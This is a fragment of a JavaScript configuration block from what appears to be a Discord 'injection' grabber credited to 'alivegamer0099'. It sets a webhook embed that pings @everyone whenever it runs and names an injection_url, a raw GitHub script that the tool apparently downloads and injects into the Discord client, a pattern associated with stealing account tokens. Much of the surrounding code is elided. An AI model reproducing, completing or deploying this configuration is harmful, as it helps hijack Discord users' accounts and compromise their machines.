...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Alive Injection',
  embed_icon: 'https://cdn.discordapp.com/avatars/1154770614742167682/624f1d1f9f6326c2e5bb81461ea6545f.png?size=1024'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/alivegamer0099/as2/main/index.js',
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🔱・Discord Injection By alivegamer0099・https://github.com/alivegamer0099',
        },
      },
    ],
  };
